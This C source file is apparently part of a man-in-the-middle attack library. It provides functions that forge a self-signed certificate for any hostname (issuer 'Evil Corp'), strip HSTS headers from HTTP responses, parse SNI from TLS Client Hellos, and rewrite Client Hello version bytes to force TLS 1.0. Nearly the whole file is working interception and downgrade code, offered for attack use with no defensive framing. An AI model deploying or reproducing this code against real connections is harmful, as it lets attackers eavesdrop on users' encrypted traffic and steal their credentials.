/*
 * libmitm_ssl.c - TLS/SSL operations for MITM attacks
 *
 * Provides:
 * - Dynamic certificate generation
 * - HSTS header stripping
 * - TLS version downgrade
 * - SNI extraction
 */

#include <openssl/evp.h>
#include <openssl/pem.h>
#include <openssl/rsa.h>
#include <openssl/ssl.h>
#include <openssl/x509.h>
#include <openssl/x509v3.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/**
 * Generate self-signed certificate for given CN
 */
int generate_cert(const char *cn, const char *cert_file, const char *key_file) {
  EVP_PKEY *pkey = NULL;
  X509 *x509 = NULL;
  RSA *rsa = NULL;
  X509_NAME *name = NULL;
  FILE *fp = NULL;
  int ret = 0;

  // Generate RSA key pair
  EVP_PKEY_CTX *ctx = EVP_PKEY_CTX_new_id(EVP_PKEY_RSA, NULL);
  if (!ctx)
    goto cleanup;

  if (EVP_PKEY_keygen_init(ctx) <= 0)
    goto cleanup;
  if (EVP_PKEY_CTX_set_rsa_keygen_bits(ctx, 2048) <= 0)
    goto cleanup;
  if (EVP_PKEY_keygen(ctx, &pkey) <= 0)
    goto cleanup;

  // Create certificate
  x509 = X509_new();
  if (!x509)
    goto cleanup;

  // Set version (X509 v3)
  X509_set_version(x509, 2);

  // Set serial number
  ASN1_INTEGER_set(X509_get_serialNumber(x509), 1);

  // Set validity (1 year)
  X509_gmtime_adj(X509_get_notBefore(x509), 0);
  X509_gmtime_adj(X509_get_notAfter(x509), 31536000L);

  // Set public key
  X509_set_pubkey(x509, pkey);

  // Set subject name
  name = X509_get_subject_name(x509);
  X509_NAME_add_entry_by_txt(name, "C", MBSTRING_ASC, (unsigned char *)"US", -1,
                             -1, 0);
  X509_NAME_add_entry_by_txt(name, "O", MBSTRING_ASC,
                             (unsigned char *)"Evil Corp", -1, -1, 0);
  X509_NAME_add_entry_by_txt(name, "CN", MBSTRING_ASC, (unsigned char *)cn, -1,
                             -1, 0);

  // Set issuer (self-signed)
  X509_set_issuer_name(x509, name);

  // Sign certificate
  if (!X509_sign(x509, pkey, EVP_sha256()))
    goto cleanup;

  // Write certificate to file
  fp = fopen(cert_file, "wb");
  if (!fp)
    goto cleanup;
  PEM_write_X509(fp, x509);
  fclose(fp);

  // Write private key to file
  fp = fopen(key_file, "wb");
  if (!fp)
    goto cleanup;
  PEM_write_PrivateKey(fp, pkey, NULL, NULL, 0, NULL, NULL);
  fclose(fp);

  ret = 1;

cleanup:
  if (ctx)
    EVP_PKEY_CTX_free(ctx);
  if (pkey)
    EVP_PKEY_free(pkey);
  if (x509)
    X509_free(x509);

  return ret;
}

/**
 * Strip HSTS header from HTTP response
 */
int strip_hsts_header(unsigned char *http_response, size_t len,
                      size_t *new_len) {
  const char *hsts_header = "Strict-Transport-Security:";
  char *pos = NULL;
  char *end_of_line = NULL;
  size_t header_len = strlen(hsts_header);

  // Find HSTS header (case-insensitive)
  for (size_t i = 0; i < len - header_len; i++) {
    if (strncasecmp((char *)(http_response + i), hsts_header, header_len) ==
        0) {
      pos = (char *)(http_response + i);
      break;
    }
  }

  if (!pos) {
    *new_len = len;
    return 0; // No HSTS header found
  }

  // Find end of line
  end_of_line = strstr(pos, "\r\n");
  if (!end_of_line) {
    *new_len = len;
    return 0;
  }

  // Remove header by shifting data
  size_t header_full_len = (end_of_line + 2) - pos;
  memmove(pos, end_of_line + 2,
          len - (pos - (char *)http_response) - header_full_len);

  *new_len = len - header_full_len;

  return 1; // Header stripped
}

/**
 * Extract SNI from TLS Client Hello
 */
int extract_sni(const unsigned char *client_hello, size_t len, char *sni_out,
                size_t sni_max_len) {
  // TLS Client Hello structure:
  // - Record header (5 bytes): type(1) version(2) length(2)
  // - Handshake header (4 bytes): type(1) length(3)
  // - Version (2 bytes)
  // - Random (32 bytes)
  // - Session ID length (1 byte) + Session ID
  // - Cipher suites length (2 bytes) + Cipher suites
  // - Compression methods length (1 byte) + Compression methods
  // - Extensions length (2 bytes)
  // - Extensions (search for SNI extension type 0x0000)

  if (len < 43)
    return 0; // Too short

  // Check for TLS handshake
  if (client_hello[0] != 0x16)
    return 0; // Not a handshake
  if (client_hello[5] != 0x01)
    return 0; // Not Client Hello

  size_t offset = 43; // Skip to session ID

  // Skip session ID
  if (offset >= len)
    return 0;
  uint8_t session_id_len = client_hello[offset++];
  offset += session_id_len;

  // Skip cipher suites
  if (offset + 2 > len)
    return 0;
  uint16_t cipher_suites_len =
      (client_hello[offset] << 8) | client_hello[offset + 1];
  offset += 2 + cipher_suites_len;

  // Skip compression methods
  if (offset >= len)
    return 0;
  uint8_t compression_len = client_hello[offset++];
  offset += compression_len;

  // Extensions
  if (offset + 2 > len)
    return 0;
  uint16_t extensions_len =
      (client_hello[offset] << 8) | client_hello[offset + 1];
  offset += 2;

  // Search for SNI extension (type 0x0000)
  size_t ext_end = offset + extensions_len;
  while (offset + 4 <= ext_end) {
    uint16_t ext_type = (client_hello[offset] << 8) | client_hello[offset + 1];
    uint16_t ext_len =
        (client_hello[offset + 2] << 8) | client_hello[offset + 3];
    offset += 4;

    if (ext_type == 0x0000) { // SNI extension
      // SNI list length
      if (offset + 2 > len)
        return 0;
      offset += 2;

      // SNI type (0x00 = hostname)
      if (offset >= len)
        return 0;
      if (client_hello[offset++] != 0x00)
        return 0;

      // SNI length
      if (offset + 2 > len)
        return 0;
      uint16_t sni_len = (client_hello[offset] << 8) | client_hello[offset + 1];
      offset += 2;

      // Extract SNI
      if (offset + sni_len > len || sni_len >= sni_max_len)
        return 0;
      memcpy(sni_out, client_hello + offset, sni_len);
      sni_out[sni_len] = '\0';

      return 1; // Success
    }

    offset += ext_len;
  }

  return 0; // SNI not found
}

/**
 * Downgrade TLS version in Client Hello
 */
int downgrade_tls_version(unsigned char *client_hello, size_t len) {
  // Check if this is a TLS handshake
  if (len < 11 || client_hello[0] != 0x16)
    return 0;

  // Record layer version (bytes 1-2)
  // Force to TLS 1.0 (0x0301)
  client_hello[1] = 0x03;
  client_hello[2] = 0x01;

  // Handshake protocol version (bytes 9-10)
  // Force to TLS 1.0
  client_hello[9] = 0x03;
  client_hello[10] = 0x01;

  return 1;
}
